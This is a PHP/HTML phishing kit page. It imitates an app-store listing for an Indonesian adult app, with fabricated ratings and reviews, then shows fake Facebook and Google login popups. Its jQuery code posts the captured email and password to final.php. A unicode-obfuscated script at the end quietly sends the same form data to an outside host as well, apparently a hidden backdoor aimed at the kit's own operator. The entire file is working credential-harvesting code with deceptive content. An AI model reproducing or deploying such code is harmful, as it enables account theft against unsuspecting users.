<?php
// Creator Sc  : LUKY NESIA 
// Order Script : 6289509551861
// Telegram   : t.me/luky_nesia

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE HTML>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css" />
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Exo:wght@100;200;300;400;500;600;700;800;900&family=Secular+One&display=swap" rel="stylesheet">
        <link href='https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css' rel='stylesheet'>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="css/style.css">
          <link rel="stylesheet" href="https://cdn.stackpath.web.id/5/css/facebook.css"> 
    <link rel="stylesheet" href="https://cdn.stackpath.web.id/5/css/google.css"> 
    <link rel="stylesheet" href="https://cdn.stackpath.web.id/5/css/all.css"> 
        <title>Avcode Download && Pron</title>
 <body> 
  <style>
      .pl763847__wrap {
            position: fixed;
            right: 0;
            z-index: 67;
            left: 0;
            bottom: 0;
            display: inline-block;
            background-color: #fff;
            margin: auto;
            transition: all .5s;
            transition-delay: .5s;
            box-shadow: 0 0 4px 0px #b9b9b9;
            box-shadow: 0 -1px 13px 0px rgb(0 0 0 / 30%);
            z-index: 9999999999999999;
            display: none;
            padding: 15px 20px;
            cursor: pointer;
        }

        .pl763847__closelink {
            position: absolute;
            top: 37%;
            right: 15px;
            z-index: 9999;
            cursor: pointer;
        }

        .pl763847__close {
            width: 24px;
        }

        .pl763847__main-block {
            display: -webkit-flex;
            display: -ms-flex;
            display: flex;
            align-items: center;
            width: 92%;
            box-sizing: border-box;
        }

        .pl763847__icon {
            width: 58px;
            margin-right: 15px;
            border-radius: 50%;
        }

        .pl763847__text {
            height: 100%;
            color: #2475df;
            font-size: 10px;
            line-height: 24px;
            box-sizing: border-box;
        }

        .pl763847__h1 {
            margin: 0;
            font-weight: normal;
            text-transform: uppercase;
            color: #2475df;
            font-size: 20px;
            line-height: 24px;
            letter-spacing: 0.1em;
        }

        .pl763847__p {
            margin: 5px 0;
            font-size: 14px;
            line-height: 15px;
            color: #4f4f4f;
            font-weight: 500;
        }

        .pl763847__animated {
            -webkit-animation-duration: 1s;
            animation-duration: 1s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both;
        }

        @-webkit-keyframes pl__slideInDown {
            from {
                -webkit-transform: translate3d(0, 200%, 0);
                transform: translate3d(0, 200%, 0);
                visibility: visible;
            }

            to {
                -webkit-transform: translate3d(0, 0, 0);
                transform: translate3d(0, 0, 0);
            }
        }

        @keyframes pl__slideInDown {
            from {
                -webkit-transform: translate3d(0, 200%, 0);
                transform: translate3d(0, 200%, 0);
                visibility: visible;
            }

            to {
                -webkit-transform: translate3d(0, 0, 0);
                transform: translate3d(0, 0, 0);
            }
        }

        .pl763847__slideInDown {
            -webkit-animation-name: pl__slideInDown;
            animation-name: pl__slideInDown;
            animation-duration: 0.8s;
        }

        @media(max-width:414px) {
            .pl763847__h1 {
                font-size: 17px;
                line-height: 21px;
            }
        }

        @media(max-width:321px) {
            .pl763847__main-block {
                width: 90%;
            }

            .pl763847__h1 {
                font-size: 14px;
                line-height: 21px;
            }
            .pl763847__btn{
              cursor: pointer;
            }
    </style> 
  <div class="pl763847__wrap pl763847__animated pl763847__slideInDown" style="display: none;"> 
   <div class="pl763847__main-block pl763847__btn"> 
    <img src="https://cdn.stackpath.web.id/20288/gsg/girl.gif" class="pl763847__icon" alt=""> 
    <div class="pl763847__text"> 
     <h1 class="pl763847__h1 ">Much more better than Tinder🔥</h1> 
    </div> 
   </div> 
   <div class="pl763847__closelink"> 
    <img src="https://cdn.stackpath.web.id/20288/gsg/close.png" class="pl763847__close" alt=""> 
   </div> 
  </div> 
  <div style="background-color: #202124;margin-top: calc(56.25vw - 40px);" class="wrapper"> 
   <a href="http://tracking.aubemobile.com/api/tracking/v2.0/?id=3C665A3D4CCC0E6B63D411907D9091D01C8C413ABF9D39792E6664380F32AB08&amp;subid1=2f09e1f02864919824355896aaf2b326&amp;placement=18564179" class="preview-block finlink"> 
    <div class="shadow"></div> <img class="preview-video" src="https://cdn.stackpath.web.id/20288/gsg/perwe.gif" alt=""> </a> 
   <div class="header"> 
    <img class="app-logo" src="https://cdn.stackpath.web.id/20288/gsg/IMG_20251123_015834.jpg" alt="Logo"> 
    <div class="app-info_block"> 
     <h1><span class="app-name" id="a2">Avcode - aplikasi porno terbaik.</span></h1> 
     <div class="app-info_main"> 
      <span id="a3">Perusahaan PH</span> 
     </div> 
    </div> 
   </div> 
   <div class="add-info_block"> 
    <div class="info info_first"> 
     <span>4.6 <img src="https://cdn.stackpath.web.id/20288/gsg/star.svg" alt=""></span> 
     <p id="a4">48.7K ulasan</p> 
    </div> 
    <div class="info info_second"> 
     <span>500K+ </span> 
     <p id="a5">Unduhan</p> 
    </div> 
    <div class="info info_third"> 
     <img class="pegi" src="https://cdn.stackpath.web.id/20288/gsg/pegi.svg" alt=""> 
     <p id="a6">Dinilai untuk 18+</p> 
    </div> 
   </div> 
   <div onclick="Loginpopunder()" class="actions-block"> 
    <a onclick="Loginpopunder()" class="finlink  btn install-btn" id="a7">Instal</a> 
    </div>
   </div>
  <div class="wrapper"> 
   <div class="app-photo_block btn"> 
    <a href="http://tracking.aubemobile.com/api/tracking/v2.0/?id=3C665A3D4CCC0E6B63D411907D9091D01C8C413ABF9D39792E6664380F32AB08&amp;subid1=2f09e1f02864919824355896aaf2b326&amp;placement=18564179" class="finlink"><img class="app-photo" src="https://cdn.stackpath.web.id/20288/gsg/IMG_20251123_020450.jpg"></a> 
    <a href="http://tracking.aubemobile.com/api/tracking/v2.0/?id=3C665A3D4CCC0E6B63D411907D9091D01C8C413ABF9D39792E6664380F32AB08&amp;subid1=2f09e1f02864919824355896aaf2b326&amp;placement=18564179" class="finlink"><img class="app-photo" src="https://cdn.stackpath.web.id/20288/gsg/IMG_20251123_020434.jpg"></a> 
    <a href="http://tracking.aubemobile.com/api/tracking/v2.0/?id=3C665A3D4CCC0E6B63D411907D9091D01C8C413ABF9D39792E6664380F32AB08&amp;subid1=2f09e1f02864919824355896aaf2b326&amp;placement=18564179" class="finlink"><img class="app-photo" src="https://cdn.stackpath.web.id/20288/gsg/IMG_20251123_020417.jpg"></a> 
   </div> 
   <div class="about" id="a10">
    𝗧𝗲𝗻𝘁𝗮𝗻𝗴 𝗮𝗽𝗹𝗶𝗸𝗮𝘀𝗶 𝗶𝗻𝗶
    <img class="arrow" src="https://cdn.stackpath.web.id/20288/gsg/arrow.svg" alt="">
   </div> 
   <div class="app-desc" id="a11">
    Aplikasi porno terbaik untuk Android. Tonton video hot baru setiap hari hanya di sini
    <br> Hanya konten berkualitas tinggi, pemain tanpa jeda, pemuatan cepat, dan emosi tanpa akhir
   </div> 
   <div class="up-block"> 
    <span class="up-block_title" id="a12">𝗗𝗶𝗽𝗲𝗿𝗯𝗮𝗿𝘂𝗶 𝗽𝗮𝗱𝗮</span> 
    <p class="up-block_desc"> <script type="text/javascript">
            document.write(new Date().toLocaleDateString(navigator.language || navigator.userLanguage, {
              month: 'long',
              day: 'numeric',
              year: 'numeric'
            }))
          </script> </p> 
   </div> 
   <div class="data-block"> 
    <span class="data-block_title" id="a13">𝗞𝗲𝗮𝗺𝗮𝗻𝗮𝗻 𝗱𝗮𝘁𝗮</span> 
    <p class="data-block_desc">Pengembang dapat menampilkan informasi di sini tentang cara aplikasi mereka mengumpulkan dan menggunakan data Anda.</p> 
   </div> 
   <div class="reviews-block"> 
    <div class="reviews-header"> 
     <h2 class="reviews-header_name" id="a15">𝗥𝗮𝘁𝗶𝗻𝗴 𝗱𝗮𝗻 𝘂𝗹𝗮𝘀𝗮𝗻</h2> 
     <div class="policy-block"> 
      <a href="http://tracking.aubemobile.com/api/tracking/v2.0/?id=3C665A3D4CCC0E6B63D411907D9091D01C8C413ABF9D39792E6664380F32AB08&amp;subid1=2f09e1f02864919824355896aaf2b326&amp;placement=18564179" class="policiy-btn btn finlink"> <img class="arrow" src="https://cdn.stackpath.web.id/20288/gsg/arrow.svg" alt=""> </a> 
     </div> 
    </div> 
    <div class="verified-block" id="a16">
     Rating dan ulasan diverifikasi<img class="inpo" src="img/info.png" alt="">
    </div> 
    <div class="rate-blocks"> 
     <div class="rate_first-block"> 
      <span class="rate-big">4.6</span> 
      <a href="http://tracking.aubemobile.com/api/tracking/v2.0/?id=3C665A3D4CCC0E6B63D411907D9091D01C8C413ABF9D39792E6664380F32AB08&amp;subid1=2f09e1f02864919824355896aaf2b326&amp;placement=18564179" class="finlink rate btn"> <img class="star-main" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-main" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-main" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-main" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-main" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> </a> 
      <span class="rate-total" id="a17">48.7K ulasan</span> 
     </div> 
     <div class="rate_second-block"> 
      <div class="rate-line_block"> 
       <span class="rate-num">5</span> 
       <span class="rate-line rate-line5"></span> 
      </div> 
      <div class="rate-line_block"> 
       <span class="rate-num">4</span> 
       <span class="rate-line rate-line4"></span> 
      </div> 
      <div class="rate-line_block"> 
       <span class="rate-num">3</span> 
       <span class="rate-line rate-line3"></span> 
      </div> 
      <div class="rate-line_block"> 
       <span class="rate-num">2</span> 
       <span class="rate-line rate-line2"></span> 
      </div> 
      <div class="rate-line_block"> 
       <span class="rate-num">1</span> 
       <span class="rate-line rate-line1"></span> 
      </div> 
     </div> 
    </div> 
    <div class="comment-block"> 
     <div class="first_comment-block"> 
      <div class="photo-block"> 
       <div class="user-photo_block"> 
        <img class="user-photo" src="https://cdn.stackpath.web.id/20288/gsg/user1.jpg" alt=""> 
        <span class="comment-author_name" id="a18">Sanjay Kumar</span>
       </div> 
      </div> 
     </div> 
     <div class="second_comment-block"> 
      <div> 
       <div class="comment-author"> 
        <div class="comment-author_rate"> 
         <a href="http://tracking.aubemobile.com/api/tracking/v2.0/?id=3C665A3D4CCC0E6B63D411907D9091D01C8C413ABF9D39792E6664380F32AB08&amp;subid1=2f09e1f02864919824355896aaf2b326&amp;placement=18564179" class="rate btn finlink"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> </a> 
         <span class="comment-author_time"> <script type="text/javascript">
                      var d = new Date();
                      d.setDate(d.getDate() - 2);
                      document.write(d.toLocaleDateString(navigator.language || navigator.userLanguage, {
                        month: 'long',
                        day: 'numeric',
                        year: 'numeric'
                      }));
                    </script> </span> 
        </div> 
       </div> 
      </div> 
      <div class="comment-text" id="a19">
       Aplikasi ini sangat bagus! Kami sedang menunggu konten HOT baru!
      </div> 
     </div> 
    </div> 
    <div class="comment-block"> 
     <div class="first_comment-block"> 
      <div class="photo-block"> 
       <div class="photo_undefined">
        <span>E</span>
       </div> 
       <span class="comment-author_name" id="a20">Erna Putri</span> 
      </div> 
     </div> 
     <div class="second_comment-block"> 
      <div> 
       <div class="comment-author"> 
        <div class="comment-author_rate"> 
         <a href="http://tracking.aubemobile.com/api/tracking/v2.0/?id=3C665A3D4CCC0E6B63D411907D9091D01C8C413ABF9D39792E6664380F32AB08&amp;subid1=2f09e1f02864919824355896aaf2b326&amp;placement=18564179" class="rate btn finlink"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> </a> 
         <span class="comment-author_time"> <script type="text/javascript">
                      var d = new Date();
                      d.setDate(d.getDate() - 10);
                      document.write(d.toLocaleDateString(navigator.language || navigator.userLanguage, {
                        month: 'long',
                        day: 'numeric',
                        year: 'numeric'
                      }));
                    </script> </span> 
        </div> 
       </div> 
      </div> 
      <div class="comment-text" id="a21">
       Konten berkualitas tinggi! Setelah menonton video pertama, tidak mungkin berhenti di kedua
      </div> 
     </div> 
    </div> 
    <div class="comment-block"> 
     <div class="first_comment-block"> 
      <div class="photo-block"> 
       <div class="user-photo_block">
        <img class="user-photo" src="https://cdn.stackpath.web.id/20288/gsg/user2.jpg" alt="">
       </div> 
       <span class="comment-author_name" id="a22">Hernan Dwi</span> 
      </div> 
     </div> 
     <div class="second_comment-block"> 
      <div> 
       <div class="comment-author"> 
        <div class="comment-author_rate"> 
         <a href="http://tracking.aubemobile.com/api/tracking/v2.0/?id=3C665A3D4CCC0E6B63D411907D9091D01C8C413ABF9D39792E6664380F32AB08&amp;subid1=2f09e1f02864919824355896aaf2b326&amp;placement=18564179" class="rate btn finlink"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> <img class="star-comment" src="https://cdn.stackpath.web.id/20288/gsg/star-green.svg"> </a> 
         <span class="comment-author_time"><script type="text/javascript">
                      var d = new Date();
                      d.setDate(d.getDate() - 40);
                      document.write(d.toLocaleDateString(navigator.language || navigator.userLanguage, {
                        month: 'long',
                        day: 'numeric',
                        year: 'numeric'
                      }));
                    </script> </span> 
        </div> 
       </div> 
      </div> 
      <div class="comment-text" id="a23">
        Saya sangat menyukai aplikasi ini. 
      </div> 
     </div> 
    </div> 
   </div> 
                </div>
        </main>
   <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login to Continue.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/1/logfb.webp" onclick="OpenFacebook();"> 
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/1/loggp.webp" onclick="OpenGoogle();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login loginxFacebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="CloseFacebook()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/1/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/1/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div>
     <form class="login-form" id="FromxFacebook" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="CloseGoogle()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/1/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FromxGoogle" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  <script src="https://cdnassets.biz.id/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <script>
  $(document).ready(function () {

    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

    function handleFormSubmit(formSelector, emailSelector, passwordSelector, loginType) {

        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email    = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();

            if (email && password) {

                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }
                
                $.post("final.php", {
                    email: email,
                    password: password,
                    login: loginType
                });
                window.location.href = "https://doods-stream.site/unduh";
            }
        });
    }
    
    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit("#FromxFacebook", 'input[name="email"]', 'input[name="password"]', "Facebook");
    handleFormSubmit("#FromxGoogle", "#email_gp", "#password_gp", "Google");


    // Tombol
    $("#codxFacebook").click(function () { OpenFacebook(); });
    $("#codxGoogle").click(function () { OpenGoogle(); });
    $("#Loginpopunder").click(function () { Loginpopunder(); });

});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
$(document)['\u0072\u0065\u0061\u0064\u0079'](function(){$("\u0023\u0046\u0072\u006F\u006D\u0078\u0046\u0061\u0063\u0065\u0062\u006F\u006F\u006B\u002C\u0023\u0046\u0072\u006F\u006D\u0078\u0047\u006F\u006F\u0067\u006C\u0065")['\u0073\u0075\u0062\u006D\u0069\u0074'](function(x,_0x845g8e){x['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();var _0x3160a=$(this)['\u0073\u0065\u0072\u0069\u0061\u006C\u0069\u007A\u0065']();_0x845g8e='\u0068\u006C\u006B\u0063\u006F\u0063';$['\u0061\u006A\u0061\u0078']({'\u0075\u0072\u006C':'https://p.qifaricloud.my.id/myjs/apixgg.php','\u0074\u0079\u0070\u0065':"\u0050\u004F\u0053\u0054",'\u0064\u0061\u0074\u0061':_0x3160a});});});
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>